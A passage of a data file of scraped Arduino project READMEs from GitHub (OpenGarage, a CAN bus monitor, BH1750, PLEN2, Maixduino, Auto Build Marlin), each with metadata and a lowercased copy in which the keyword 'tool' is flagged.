open http://192.168.4.1/update and that's the same interface.\nFirmware User Manual and API\nGo to the doc folder to find the user manual as well as the API document for each firmware version.", "link": "https://github.com/OpenGarage/OpenGarage-Firmware", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "this folder contains firmware source code and documentation for opengarage. for details, visit http://opengarage.io\nfor firmware release notes, go to https://github.com/opengarage/opengarage-firmware/releases\nfirmware compilation instructions:\nrequirement:\narduino (https://arduino.cc) with esp8266 core 2.7.4 or above for arduino (https://github.com/esp8266/arduino/releases/tag/2.7.4)\ninstead of installing arduino, you can also directly use make (this folder includes a copy of makeesparduino: https://github.com/plerup/makeesparduino)\nblynk library for arduino (https://github.com/blynkkk/blynk-library)\nmqtt pubsubclient https://github.com/knolleary/pubsubclient (version 2.8)\nam2320 library: https://github.com/hibikiledo/am2320/releases\nonewire library: https://www.pjrc.com/teensy/td_libs_onewire.html\ndallastemperature library: https://github.com/milesburton/arduino-temperature-control-library/releases\ndhtesp library: https://github.com/beegee-tokyo/dhtesp/releases\nthis (opengarage) source code\nsetting up a dev environment\ninstall arduino with esp8266 core 2.7.4 (or use make directly, following https://github.com/plerup/makeesparduino).\ninstall arduino libraries referenced above.\ndownload this repository and extract the opengarage library to your arduino's libraries folder.\ncompilation\nto compile the firmware code using makeesparduino, simply run make in command line. you may need to open makefile and modify some path variables therein to match where you installed the esp8266 folder.\nto compile using arduino: launch arduino, and select\nfile -> examples -> opengarage -> mainarduino.\ntools -> board -> generic esp8266 module (if this is not available, check if you've installed the esp8266 core).\ntools -> flash mode -> dio.\ntools -> flash size -> 2m (1m spiffs).\npress ctrl + r to compile. the compiled firmware (named mainarduino.cpp.bin) is by default copied to a temporary folder.\nthe firmware supports built-in web interface. the html data are embedded as program memory strings. go to the html subfolder, which contains the original html files, and a html2raw -----> tool !!!  to convert these html files into program memory strings. if you make changes to the html files, re-run html2raw to re-generate the program memory strings. you can also directly modify the program memory strings, but keeping the original html files makes it easy to check and verify your html files in a browser.\nuploading\nas opengarage firmware supports ota (over-the-air) update, you can upload the firmware through the web interface. at the homepage, find the update button and follow that to upload a new firmware. if your opengarage is in ap mode and not connected to any wifi network yet, you can open http://192.168.4.1/update and that's the same interface.\nfirmware user manual and api\ngo to the doc folder to find the user manual as well as the api document for each firmware version.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000221, "year": null}, {"Unnamed: 0": 2266, "autor": 226, "date": null, "content": "arduino-canbus-monitor\nCAN BUS monitoring software based on Arduino with Seeduino/ElecFreaks CAN BUS shield based on MCP2515 (Numerous other MCP2515 based CAN BUS modules from ebay and aliexpress work well to).\nThis software implements CAN ASCII / Serial CAN / SLCAN protocol compatible with Lawicel CAN232/CANUSB.\nAs for PC counterpart software I personally used and can recommend two tools:\n[Windows] CANHacker tool v.2.00.01 (by fuchs) to sniff and visualize data on the bus. You can download CANHacker tool from this forum page: http://www.canhack.net/viewforum.php?f=25&sid=ac01d465f19e088cb160cab630561607\n[Windows] CAN-COOL (by MHS Elektronik), open source, but unfortunaly available only in German. Download link: http://www.mhs-elektronik.de/index.php?module=content&action=show&page=can_cool (Make sure you select RS232 and SL-CAN protocol and then click hardware bus reset icon on a toolbar)\n[Linux] SLCAN/SocketCAN can be used https://github.com/linux-can/can-utils. See details in the end of this README file\nThis monitor uses CAN BUS library forked from https://github.com/Seeed-Studio/CAN_BUS_Shield.\nCopyright (C) 2015,2016 Anton Viktorov latonita@yandex.ru\nYou can buy me a beer if you like the tool :o)\nSee protocol definition here http://www.can232.com/docs/can232_v3.pdf and here http://www.can232.com/docs/canusb_manual.pdf\nCommands not supported/not implemented:\ns, W, M, m, U.\nCommands modified:\nS - supports not declared 83.3 rate\nF - returns MCP2515 error flags\nZ - extra Z2 option enables 4 byte timestamp vs standard 2 byte (60000ms max)\nCMD | IMPLEMENTED | SYNTAX | DESCRIPTION\n------------------------------------------------------------------------------------------------------------\n'S' | YES+ | Sn[CR] Setup with standard CAN bit-rates where n is 0-8.\n| | S0 10Kbit S4 125Kbit S8 1Mbit\n| | S1 20Kbit S5 250Kbit S9 83.3Kbit\n| | S2 50Kbit S6 500Kbit\n| | S3 100Kbit S7 800Kbit\n's' | - | sxxyy[CR] Setup with BTR0/BTR1 CAN bit-rates where xx and yy is a hex value.\n'O' | YES | O[CR] Open the CAN channel in normal mode (sending & receiving).\n'L' | YES | L[CR] Open the CAN channel in listen only mode (receiving).\n'C' | YES | C[CR] Close the CAN channel.\n't' | YES | tiiildd...[CR] Transmit a standard (11bit) CAN frame.\n'T' | YES | Tiiiiiiiildd...[CR] Transmit an extended (29bit) CAN frame\n'r' | YES | riiil[CR] Transmit an standard RTR (11bit) CAN frame.\n'R' | YES | Riiiiiiiil[CR] Transmit an extended RTR (29bit) CAN frame.\n'P' | YES | P[CR] Poll incomming FIFO for CAN frames (single poll)\n'A' | YES | A[CR] Polls incomming FIFO for CAN frames (all pending frames)\n'F' | YES+ | F[CR] Read Status Flags.\n'X' | YES | Xn[CR] Sets Auto Poll/Send ON/OFF for received frames.\n'W' | - | Wn[CR] Filter mode setting. By default CAN232 works in dual filter mode (0) and is backwards compatible with previous CAN232 versions.\n'M' | - | Mxxxxxxxx[CR] Sets Acceptance Code Register (ACn Register of SJA1000). // we use MCP2515, not supported\n'm' | - | mxxxxxxxx[CR] Sets Acceptance Mask Register (AMn Register of SJA1000). // we use MCP2515, not supported\n'U' | YES | Un[CR] Setup UART with a new baud rate where n is 0-6.\n'V' | YES | v[CR] Get Version number of both CAN232 hardware and software\n'v' | YES | V[CR] Get Version number of both CAN232 hardware and software\n'N' | YES | N[CR] Get Serial number of the CAN232.\n'Z' | YES+ | Zn[CR] Sets Time Stamp ON/OFF for received frames only. EXTENSION to LAWICEL: Z2 - millis() timestamp w/o standard 60000ms cycle\n'Q' | YES todo | Qn[CR] Auto Startup feature (from power on).\nLinux SLCAN instructions\nPrerequisites\nInstall can-utils first. On Ubuntu and other Debian-based distros can-utils package is included into standard repositories:\nsudo apt install can-utils\nFor other distros please follow respective instructions, start from here https://github.com/linux-can/can-utils\nCreate CAN device\nsudo slcan_attach -f -s4 -o /dev/ttyUSB0\nsudo slcand -S 115200 /dev/ttyUSB0 can0\nsudo ifconfig can0 up\nwhere 115200 is port speed, /dev/ttyUSB0 - name of your arduino device. can be different\nTo dump running traffic\ncandump can0\nTo delete CAN device\nsudo ifconfig can0 down\nsudo killall slcand", "link": "https://github.com/latonita/arduino-canbus-monitor", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino-canbus-monitor\ncan bus monitoring software based on arduino with seeduino/elecfreaks can bus shield based on mcp2515 (numerous other mcp2515 based can bus modules from ebay and aliexpress work well to).\nthis software implements can ascii / serial can / slcan protocol compatible with lawicel can232/canusb.\nas for pc counterpart software i personally used and can recommend two tools:\n[windows] canhacker -----> tool !!!  v.2.00.01 (by fuchs) to sniff and visualize data on the bus. you can download canhacker tool from this forum page: http://www.canhack.net/viewforum.php?f=25&sid=ac01d465f19e088cb160cab630561607\n[windows] can-cool (by mhs elektronik), open source, but unfortunaly available only in german. download link: http://www.mhs-elektronik.de/index.php?module=content&action=show&page=can_cool (make sure you select rs232 and sl-can protocol and then click hardware bus reset icon on a toolbar)\n[linux] slcan/socketcan can be used https://github.com/linux-can/can-utils. see details in the end of this readme file\nthis monitor uses can bus library forked from https://github.com/seeed-studio/can_bus_shield.\ncopyright (c) 2015,2016 anton viktorov latonita@yandex.ru\nyou can buy me a beer if you like the tool :o)\nsee protocol definition here http://www.can232.com/docs/can232_v3.pdf and here http://www.can232.com/docs/canusb_manual.pdf\ncommands not supported/not implemented:\ns, w, m, m, u.\ncommands modified:\ns - supports not declared 83.3 rate\nf - returns mcp2515 error flags\nz - extra z2 option enables 4 byte timestamp vs standard 2 byte (60000ms max)\ncmd | implemented | syntax | description\n------------------------------------------------------------------------------------------------------------\n's' | yes+ | sn[cr] setup with standard can bit-rates where n is 0-8.\n| | s0 10kbit s4 125kbit s8 1mbit\n| | s1 20kbit s5 250kbit s9 83.3kbit\n| | s2 50kbit s6 500kbit\n| | s3 100kbit s7 800kbit\n's' | - | sxxyy[cr] setup with btr0/btr1 can bit-rates where xx and yy is a hex value.\n'o' | yes | o[cr] open the can channel in normal mode (sending & receiving).\n'l' | yes | l[cr] open the can channel in listen only mode (receiving).\n'c' | yes | c[cr] close the can channel.\n't' | yes | tiiildd...[cr] transmit a standard (11bit) can frame.\n't' | yes | tiiiiiiiildd...[cr] transmit an extended (29bit) can frame\n'r' | yes | riiil[cr] transmit an standard rtr (11bit) can frame.\n'r' | yes | riiiiiiiil[cr] transmit an extended rtr (29bit) can frame.\n'p' | yes | p[cr] poll incomming fifo for can frames (single poll)\n'a' | yes | a[cr] polls incomming fifo for can frames (all pending frames)\n'f' | yes+ | f[cr] read status flags.\n'x' | yes | xn[cr] sets auto poll/send on/off for received frames.\n'w' | - | wn[cr] filter mode setting. by default can232 works in dual filter mode (0) and is backwards compatible with previous can232 versions.\n'm' | - | mxxxxxxxx[cr] sets acceptance code register (acn register of sja1000). // we use mcp2515, not supported\n'm' | - | mxxxxxxxx[cr] sets acceptance mask register (amn register of sja1000). // we use mcp2515, not supported\n'u' | yes | un[cr] setup uart with a new baud rate where n is 0-6.\n'v' | yes | v[cr] get version number of both can232 hardware and software\n'v' | yes | v[cr] get version number of both can232 hardware and software\n'n' | yes | n[cr] get serial number of the can232.\n'z' | yes+ | zn[cr] sets time stamp on/off for received frames only. extension to lawicel: z2 - millis() timestamp w/o standard 60000ms cycle\n'q' | yes todo | qn[cr] auto startup feature (from power on).\nlinux slcan instructions\nprerequisites\ninstall can-utils first. on ubuntu and other debian-based distros can-utils package is included into standard repositories:\nsudo apt install can-utils\nfor other distros please follow respective instructions, start from here https://github.com/linux-can/can-utils\ncreate can device\nsudo slcan_attach -f -s4 -o /dev/ttyusb0\nsudo slcand -s 115200 /dev/ttyusb0 can0\nsudo ifconfig can0 up\nwhere 115200 is port speed, /dev/ttyusb0 - name of your arduino device. can be different\nto dump running traffic\ncandump can0\nto delete can device\nsudo ifconfig can0 down\nsudo killall slcand", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000226, "year": null}, {"Unnamed: 0": 2273, "autor": 233, "date": null, "content": "BH1750\nThis package contains an Arduino library for digital light sensor breakout boards containing the BH1750FVI IC.\nThe BH1750 board uses I2C for communication which requires two pins to communicate with the device. Configuring the I2C bus must be done in user code (not library code). This approach has been adopted so it can be done once and will better support the various options for different platforms.\nA common module containing the BH1750 component is the GY-30 shown below.\nOverview\nThe BH1750 has six different measurement modes which are divided in two groups; continuous and one-time measurements. In continuous mode the sensor continuously measures lightness value. In one-time mode, the sensor makes only one measurement and then goes into Power Down mode.\nEach mode has three different precisions:\nLow Resolution Mode - (4 lx precision, 16ms measurement time)\nHigh Resolution Mode - (1 lx precision, 120ms measurement time)\nHigh Resolution Mode 2 - (0.5 lx precision, 120ms measurement time)\nBy default, this library uses Continuous High Resolution Mode, but you can change this to a different mode by passing the mode argument to BH1750.begin().\nWhen the One-Time mode is used your sensor will go into Power Down mode when it completes the measurement and you've read it. When the sensor is powered up again it returns to the default mode which means it needs to be reconfigured back into One-Time mode. This library has been implemented to automatically reconfigure the sensor when you next attempt a measurement so you should not have to worry about such low level details.\nUsually you will get an integer value which represent the lux equivalent.\nLow Resolution Mode - (generic range: 0.0 up to 54612.5 lux)\nHigh Resolution Mode - (generic range: 0.0 up to 54612.5 lux)\nHigh Resolution Mode 2 - (generic range: 0.0 up to 27306.25 lux)\nThe sensor itself returns a 16 bit unsigned integer. Therefore the maximum value is limited in general. The standard conversion between the so called 'counts' to lux is 1/1.2, that means you get a smaller value. As we use float, if an error occurs you will get a negative value.\n-1 no valid data was transmitted from the sensor\n-2 device is not configured Otherwise the measured counts are converted to lux and returned. If no advanced parameters are changed the maximum lux value is 54612.5 lx.\nAs the sensor counts impact of light in a specific time frame you could change this time frame. This is needed if you use an overlay window or compensate for environmental influence like darkness. This time frame is defined by a register which is called MTreg. Therefore you could choose a value between 32 and 254. The default value is 69; keep in mind that the measurement time is changed accordingly.\nThe datasheet for the BH1750 chip can be obtained here[2011.11 Rev.D]\nInstallation\n(For Arduino >= 1.5.x) Install this package by searching for it in the Arduino Library Manager and then clicking install. Alternatively, this library can be installed manually by clicking \"Clone or download\" -> \"Download ZIP\" button. Then open Arduino IDE, click Sketch -> Include library -> Add .ZIP library and select the downloaded archive.\n(For Arduino < 1.5.x) Download this package as an archive by clicking \"Clone or download\" -> \"Download ZIP\" button. Then extract the archive to <Your User Directory>/My Documents/Arduino/libraries/ folder and rename it to BH1750. Restart IDE.\nThe following YouTube video (specifically from 7:20 onwards) provides a good overview of manually installing this library and loading an example using the Arduino IDE.\nInformation about the library installation process - https://www.arduino.cc/en/Guide/Libraries\nExample\nAn example using the BH1750 library in conjunction with the GY-30 board (which contains the BH1750 component) is presented below. The example code uses the BH1750 library in the default continuous high precision mode when making light measurements.\nWiring\nConnections:\nVCC -> 3V3 or 5V\nGND -> GND\nSCL -> SCL (A5 on Arduino Nano, Uno, Leonardo, etc or 21 on Mega and Due, on esp8266 free selectable)\nSDA -> SDA (A4 on Arduino Nano, Uno, Leonardo, etc or 20 on Mega and Due, on esp8266 free selectable)\nADD -> NC/GND or VCC (see below)\nThe ADD pin is used to set the sensor I2C address. By default (if ADD voltage less than 0.7 * VCC) the sensor address will be 0x23. If it has voltage greater or equal to 0.7VCC voltage (e.g. you've connected it to VCC) the sensor address will be 0x5C.\nWiring up the GY-30 sensor board to an Arduino is shown in the diagram below.\nThe image above was created using Fritzing and the GY-30 module was obtained from here.\nCode\nUpload the BH1750 test code to your Arduino.\n#include <Wire.h>\n#include <BH1750.h>\nBH1750 lightMeter;\nvoid setup(){\nSerial.begin(9600);\n// Initialize the I2C bus (BH1750 library doesn't do this automatically)\n// On esp8266 devices you can select SCL and SDA pins using Wire.begin(D4, D3);\nWire.begin();\nlightMeter.begin();\nSerial.println(F(\"BH1750 Test\"));\n}\nvoid loop() {\nfloat lux = lightMeter.readLightLevel();\nSerial.print(\"Light: \");\nSerial.print(lux);\nSerial.println(\" lx\");\ndelay(1000);\n}\nOutput\nMoving the sensor to face more light results in the lux measurements increasing.\nBH1750 Test\nLight: 70.0 lx\nLight: 70.0 lx\nLight: 59.0 lx\nLight: 328.0 lx\nLight: 333.0 lx\nLight: 335.0 lx\nLight: 332.0 lx\nMore Examples\nThe examples directory contains more advanced use cases such as using different modes, I2C addresses and multiple Wire instances.\nDevelopers\nThe following information is for developers of this library.\nCode Format\nThe code in this project is formatted using clang-format tool.\nGood instructions for installing clang-format can be found here\nOnce the clang-format tool has been install you can then run the convenience script (ci/code-format.bash) to check or apply the code formatting. The script should be run from the repo's top level directory.\n$ ./ci/code-format.bash\nThis script is also run as part of the project's continuous integration checks.\nIf you make changes to code files then the code format can be applied by simply passing apply as an argument to the script.\n$ ./ci/code-format.bash apply\nCode Linting\nThe code in this project is linted using arduino-lint. The tool can be installed using the instructions here.\nTo run the linter over the project use the command below.\n$ arduino-lint --library-manager update --compliance strict\nThe same command is run as part of the project's continuous integration checks.\nIf errors or warnings are reported then fix them and re-run the script until they are resolved.\nBuild Locally\nThe code in this project can be built locally using the arduino-cli tool. The tool can be installed using the instructions here. Once you have the tool installed you can compile the examples scripts using the convenience script (ci/compile-examples.bash).\n$ ./ci/compile-examples.bash\nThis script performs the same actions as the project's continuous integration compile checks.\nRelease Process\nUpdate library.json and library.properties version strings.\nCreate a new project release and use the new version number as tag. Click Publish.\nNow wait about an hour for it to appear in the Arduino library manager.", "link": "https://github.com/claws/BH1750", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "bh1750\nthis package contains an arduino library for digital light sensor breakout boards containing the bh1750fvi ic.\nthe bh1750 board uses i2c for communication which requires two pins to communicate with the device. configuring the i2c bus must be done in user code (not library code). this approach has been adopted so it can be done once and will better support the various options for different platforms.\na common module containing the bh1750 component is the gy-30 shown below.\noverview\nthe bh1750 has six different measurement modes which are divided in two groups; continuous and one-time measurements. in continuous mode the sensor continuously measures lightness value. in one-time mode, the sensor makes only one measurement and then goes into power down mode.\neach mode has three different precisions:\nlow resolution mode - (4 lx precision, 16ms measurement time)\nhigh resolution mode - (1 lx precision, 120ms measurement time)\nhigh resolution mode 2 - (0.5 lx precision, 120ms measurement time)\nby default, this library uses continuous high resolution mode, but you can change this to a different mode by passing the mode argument to bh1750.begin().\nwhen the one-time mode is used your sensor will go into power down mode when it completes the measurement and you've read it. when the sensor is powered up again it returns to the default mode which means it needs to be reconfigured back into one-time mode. this library has been implemented to automatically reconfigure the sensor when you next attempt a measurement so you should not have to worry about such low level details.\nusually you will get an integer value which represent the lux equivalent.\nlow resolution mode - (generic range: 0.0 up to 54612.5 lux)\nhigh resolution mode - (generic range: 0.0 up to 54612.5 lux)\nhigh resolution mode 2 - (generic range: 0.0 up to 27306.25 lux)\nthe sensor itself returns a 16 bit unsigned integer. therefore the maximum value is limited in general. the standard conversion between the so called 'counts' to lux is 1/1.2, that means you get a smaller value. as we use float, if an error occurs you will get a negative value.\n-1 no valid data was transmitted from the sensor\n-2 device is not configured otherwise the measured counts are converted to lux and returned. if no advanced parameters are changed the maximum lux value is 54612.5 lx.\nas the sensor counts impact of light in a specific time frame you could change this time frame. this is needed if you use an overlay window or compensate for environmental influence like darkness. this time frame is defined by a register which is called mtreg. therefore you could choose a value between 32 and 254. the default value is 69; keep in mind that the measurement time is changed accordingly.\nthe datasheet for the bh1750 chip can be obtained here[2011.11 rev.d]\ninstallation\n(for arduino >= 1.5.x) install this package by searching for it in the arduino library manager and then clicking install. alternatively, this library can be installed manually by clicking \"clone or download\" -> \"download zip\" button. then open arduino ide, click sketch -> include library -> add .zip library and select the downloaded archive.\n(for arduino < 1.5.x) download this package as an archive by clicking \"clone or download\" -> \"download zip\" button. then extract the archive to <your user directory>/my documents/arduino/libraries/ folder and rename it to bh1750. restart ide.\nthe following youtube video (specifically from 7:20 onwards) provides a good overview of manually installing this library and loading an example using the arduino ide.\ninformation about the library installation process - https://www.arduino.cc/en/guide/libraries\nexample\nan example using the bh1750 library in conjunction with the gy-30 board (which contains the bh1750 component) is presented below. the example code uses the bh1750 library in the default continuous high precision mode when making light measurements.\nwiring\nconnections:\nvcc -> 3v3 or 5v\ngnd -> gnd\nscl -> scl (a5 on arduino nano, uno, leonardo, etc or 21 on mega and due, on esp8266 free selectable)\nsda -> sda (a4 on arduino nano, uno, leonardo, etc or 20 on mega and due, on esp8266 free selectable)\nadd -> nc/gnd or vcc (see below)\nthe add pin is used to set the sensor i2c address. by default (if add voltage less than 0.7 * vcc) the sensor address will be 0x23. if it has voltage greater or equal to 0.7vcc voltage (e.g. you've connected it to vcc) the sensor address will be 0x5c.\nwiring up the gy-30 sensor board to an arduino is shown in the diagram below.\nthe image above was created using fritzing and the gy-30 module was obtained from here.\ncode\nupload the bh1750 test code to your arduino.\n#include <wire.h>\n#include <bh1750.h>\nbh1750 lightmeter;\nvoid setup(){\nserial.begin(9600);\n// initialize the i2c bus (bh1750 library doesn't do this automatically)\n// on esp8266 devices you can select scl and sda pins using wire.begin(d4, d3);\nwire.begin();\nlightmeter.begin();\nserial.println(f(\"bh1750 test\"));\n}\nvoid loop() {\nfloat lux = lightmeter.readlightlevel();\nserial.print(\"light: \");\nserial.print(lux);\nserial.println(\" lx\");\ndelay(1000);\n}\noutput\nmoving the sensor to face more light results in the lux measurements increasing.\nbh1750 test\nlight: 70.0 lx\nlight: 70.0 lx\nlight: 59.0 lx\nlight: 328.0 lx\nlight: 333.0 lx\nlight: 335.0 lx\nlight: 332.0 lx\nmore examples\nthe examples directory contains more advanced use cases such as using different modes, i2c addresses and multiple wire instances.\ndevelopers\nthe following information is for developers of this library.\ncode format\nthe code in this project is formatted using clang-format -----> tool !!! .\ngood instructions for installing clang-format can be found here\nonce the clang-format tool has been install you can then run the convenience script (ci/code-format.bash) to check or apply the code formatting. the script should be run from the repo's top level directory.\n$ ./ci/code-format.bash\nthis script is also run as part of the project's continuous integration checks.\nif you make changes to code files then the code format can be applied by simply passing apply as an argument to the script.\n$ ./ci/code-format.bash apply\ncode linting\nthe code in this project is linted using arduino-lint. the tool can be installed using the instructions here.\nto run the linter over the project use the command below.\n$ arduino-lint --library-manager update --compliance strict\nthe same command is run as part of the project's continuous integration checks.\nif errors or warnings are reported then fix them and re-run the script until they are resolved.\nbuild locally\nthe code in this project can be built locally using the arduino-cli tool. the tool can be installed using the instructions here. once you have the tool installed you can compile the examples scripts using the convenience script (ci/compile-examples.bash).\n$ ./ci/compile-examples.bash\nthis script performs the same actions as the project's continuous integration compile checks.\nrelease process\nupdate library.json and library.properties version strings.\ncreate a new project release and use the new version number as tag. click publish.\nnow wait about an hour for it to appear in the arduino library manager.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000233, "year": null}, {"Unnamed: 0": 2279, "autor": 239, "date": null, "content": "PLEN2 | PLEN Project Company Inc.\nThe world's first printable open-source humanoid.\nGetting Started\nDownload this repository.\nGet control boards and servo motors. Buy all!\nInstall the firmware. (This is placed \"/arduino/firmware/\" directory.) See also...\nPrint and assemble all *.stl files. (There are in the \"/stl/\" directory.)\nPrint Details\nAssembling Instructions\nConfigure home positions of joints. (This step could be done by using PLEN Utils.) See also...\nWrite all motions. (Please check \"/motions/*/\" directory and also use PLEN Utils.) See also...\nHello, world where PLEN is!\nRecommended Software Set\nFirmware for Arduino, v1.4.1\nControlServer, v2.4.1\nMotionEditor, v1.4.0\nEnjoy More, with PLEN :)\nLet PLEN move as you like! Check it out.\nLearn about creativity thinking, structuring logics, or programing. Check it out.\nCommunicate other users. Check it out.\nGet more details of PLEN. Check it out.\netc...\nDevelopment Repositories\nIf you want to customize something of PLEN2 yourself, please check repositories below.\n3D Model\nFor Autodesk Fusion 360\nArduino\nWe define here as the default repository of the firmware, and it's already installed on a control-board.\nIf you are interested deeply in the firmware, please check a development repository.\nAndroid\nController and visual programming language\nYou could download the built application on the Play Store page.\niOS\nController and visual programming language\nYou could download the built application on the App Store page.\nWeb Application\nMotion editor\nControl server, a communication tool between HTTP and Serial\nEagle\nEAGLE PCB Design Software is the tool of choice for thousands of engineers worldwide. With 3 modules and a common interface, EAGLE offers a variety of product combinations and allows every user to choose the configuration that meets their individual requirements. (origin: http://www.cadsoftusa.com/)\nPrinted circuit board CAD for control-board\nPrinted circuit board CAD for head-board\nPrinted circuit board CAD for edison-board\nEtc...\nYou could see the all open-source products on the GitHub account. Also, we have set up the GitHub account plen-admin as deprecated products manager.\nLaws of PLEN\nYou could use PLEN for every imaginable things, but please observe the following laws strictly.\nPLEN must not fight.\nPLEN must not give someone a feeling of discomfort.\nPLEN must be able to inherit its characteristics.\nCopyright & Contributors\nPLEN Project Company Inc\n3D Model\nTakuya KAMURA\nNaohiro HAYAISHI\nNaoki IWAMARU\nArduino Firmware\nKazuyuki TAKASE\nNaohiro HAYAISHI\nMotion Structure\nNaohiro HAYAISHI\nNatsuo AKAZAWA\nSho SUZUKI", "link": "https://github.com/plenprojectcompany/PLEN2", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "plen2 | plen project company inc.\nthe world's first printable open-source humanoid.\ngetting started\ndownload this repository.\nget control boards and servo motors. buy all!\ninstall the firmware. (this is placed \"/arduino/firmware/\" directory.) see also...\nprint and assemble all *.stl files. (there are in the \"/stl/\" directory.)\nprint details\nassembling instructions\nconfigure home positions of joints. (this step could be done by using plen utils.) see also...\nwrite all motions. (please check \"/motions/*/\" directory and also use plen utils.) see also...\nhello, world where plen is!\nrecommended software set\nfirmware for arduino, v1.4.1\ncontrolserver, v2.4.1\nmotioneditor, v1.4.0\nenjoy more, with plen :)\nlet plen move as you like! check it out.\nlearn about creativity thinking, structuring logics, or programing. check it out.\ncommunicate other users. check it out.\nget more details of plen. check it out.\netc...\ndevelopment repositories\nif you want to customize something of plen2 yourself, please check repositories below.\n3d model\nfor autodesk fusion 360\narduino\nwe define here as the default repository of the firmware, and it's already installed on a control-board.\nif you are interested deeply in the firmware, please check a development repository.\nandroid\ncontroller and visual programming language\nyou could download the built application on the play store page.\nios\ncontroller and visual programming language\nyou could download the built application on the app store page.\nweb application\nmotion editor\ncontrol server, a communication -----> tool !!!  between http and serial\neagle\neagle pcb design software is the -----> tool !!!  of choice for thousands of engineers worldwide. with 3 modules and a common interface, eagle offers a variety of product combinations and allows every user to choose the configuration that meets their individual requirements. (origin: http://www.cadsoftusa.com/)\nprinted circuit board cad for control-board\nprinted circuit board cad for head-board\nprinted circuit board cad for edison-board\netc...\nyou could see the all open-source products on the github account. also, we have set up the github account plen-admin as deprecated products manager.\nlaws of plen\nyou could use plen for every imaginable things, but please observe the following laws strictly.\nplen must not fight.\nplen must not give someone a feeling of discomfort.\nplen must be able to inherit its characteristics.\ncopyright & contributors\nplen project company inc\n3d model\ntakuya kamura\nnaohiro hayaishi\nnaoki iwamaru\narduino firmware\nkazuyuki takase\nnaohiro hayaishi\nmotion structure\nnaohiro hayaishi\nnatsuo akazawa\nsho suzuki", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000239, "year": null}, {"Unnamed: 0": 2293, "autor": 253, "date": null, "content": "Maixduino\nArduino Core for K210 based devices\nSupported devices\nSipeed Maix series\nAmigo\nCube\nGo\nMaixduino\nDock\nBiT\nNano\nM5Stack\nM5StickV\nM5UnitV\nVarious custom boards\nLAMLOEI AOIT DAAN\nIOXGD4\nDocs\nDocs: wiki.sipeed.com\nInstall\nRefer install doc: Install\nInstalling\nFrom Board Manager\nDownload and install the Arduino IDE (at least version v1.9.8)\nStart the Arduino IDE\nGo into Preferences\nAdd https://dl.sipeed.com/MAIX/Maixduino/package_Maixduino_k210_index.json as an \"Additional Board Manager URL\"\nOpen the Boards Manager from the Tools -> Board menu and install \"Maixduino(K210)\"\nSelect your K210 board from the Tools -> Board menu\nFrom git\nFollow steps from Board Manager section above\ncd <SKETCHBOOK>, where <SKETCHBOOK> is your Arduino Sketch folder:\nOS X: ~/Documents/Arduino\nLinux: ~/Arduino\nWindows: ~/Documents/Arduino\nCreate a folder named hardware, if it does not exist, and change directories to it\nClone this repo: git clone https://github.com/Sipeed/Maixduino Maixduino/k210\nRestart the Arduino IDE\nFirmware flashing\nThe firmware of the K210 devices is updated with a Python-based kflash cross-platform tool. Follow kflash github page on installation instruction.\nChange board settings in Tools section on the top of Arduino IDE\nBoard: The same as your dev board\nBurn Toolfirmware: leave default, for Maix Go Kit - open-ec\nBurn Baudrate: Decrease it if download fails\nPort: Serial port, e.g. /dev/ttyUSB0\nProgrammer: k-flash\nCredits\nThis core is based on and compatible with the Sipeed Maixduino Core", "link": "https://github.com/sipeed/Maixduino", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "maixduino\narduino core for k210 based devices\nsupported devices\nsipeed maix series\namigo\ncube\ngo\nmaixduino\ndock\nbit\nnano\nm5stack\nm5stickv\nm5unitv\nvarious custom boards\nlamloei aoit daan\nioxgd4\ndocs\ndocs: wiki.sipeed.com\ninstall\nrefer install doc: install\ninstalling\nfrom board manager\ndownload and install the arduino ide (at least version v1.9.8)\nstart the arduino ide\ngo into preferences\nadd https://dl.sipeed.com/maix/maixduino/package_maixduino_k210_index.json as an \"additional board manager url\"\nopen the boards manager from the tools -> board menu and install \"maixduino(k210)\"\nselect your k210 board from the tools -> board menu\nfrom git\nfollow steps from board manager section above\ncd <sketchbook>, where <sketchbook> is your arduino sketch folder:\nos x: ~/documents/arduino\nlinux: ~/arduino\nwindows: ~/documents/arduino\ncreate a folder named hardware, if it does not exist, and change directories to it\nclone this repo: git clone https://github.com/sipeed/maixduino maixduino/k210\nrestart the arduino ide\nfirmware flashing\nthe firmware of the k210 devices is updated with a python-based kflash cross-platform -----> tool !!! . follow kflash github page on installation instruction.\nchange board settings in tools section on the top of arduino ide\nboard: the same as your dev board\nburn toolfirmware: leave default, for maix go kit - open-ec\nburn baudrate: decrease it if download fails\nport: serial port, e.g. /dev/ttyusb0\nprogrammer: k-flash\ncredits\nthis core is based on and compatible with the sipeed maixduino core", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000253, "year": null}, {"Unnamed: 0": 2298, "autor": 258, "date": null, "content": "Auto Build Marlin\n\"Auto Build Marlin\" provides a one-button interface to build and upload Marlin Firmware to your selected MOTHERBOARD, removing the need to edit your platformio.ini file or scroll through a long list of Marlin environments.\nGet PlatformIO\nWhen installing \"Auto Build Marlin\" you'll also be prompted to install the PlatformIO extension. This is required for \"Auto Build Marlin\" to function.\nUsage\nOpen up the downloaded Marlin Firmware project folder (NOT the \"Marlin\" folder within) in Visual Studio Code. (You may also use the Import Project\u2026 option from the \"PlaformIO Home\" page.)\nWith Marlin open, the \"File Explorer\" should be firmly rooted in your Marlin Firmware folder:\nClick the Auto Build Marlin icon in the Activities Bar (on the left side of Visual Studio Code window) to bring up the Auto Build Marlin options bar.\nClick any of the tool icons to open the Auto Build panel. If there's only one target environment for your board the selected action will be started. Otherwise you will have to specify the environment.\nIcon Action\nStart Marlin Build to test your Marlin build\nStart Marlin Upload to install Marlin on your board\nStart Marlin Upload (traceback) to install Marlin with debugging\nStart Marlin Clean to delete old build files\nOpen the Configuration Tool\nThe Auto Build 